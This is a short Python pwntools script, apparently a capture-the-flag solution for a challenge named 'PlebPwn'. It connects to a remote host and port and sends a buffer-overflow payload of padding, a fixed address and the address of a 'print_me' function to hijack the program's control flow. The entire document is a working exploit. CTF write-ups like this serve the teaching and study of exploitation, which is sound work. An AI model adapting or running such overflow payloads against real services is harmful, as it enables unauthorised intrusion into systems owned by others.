#! /usr/bin/env python3
##
# Created for the PlebPwn challenge
# By Amos Ng
##
from pwn import *

# Define ELF static variables
e = ELF("plebpwn")
print_me = e.symbols[b"print_me"]

# Keep tube quiet
with context.local(log_level='error'): 
    t = remote("128.199.98.78", 1700)

# Prepare payload
payload = (("A" * (64)).encode()
           + b"\x00\xa0\x04\x08" # Don't use encode here, bad things happen.
                                 # Use as raw byte
           + ("B" * 12).encode()
           + p32(print_me))
log.info("Trying: %s" % (repr(payload)))
t.recvuntil("Please enter the password: ")
t.send(payload)

# Check if successful
try:
    log.info(t.recv(timeout=3).decode())
except EOFError:
    pass

# Keep tube quiet
with context.local(log_level='error'): 
    t.close()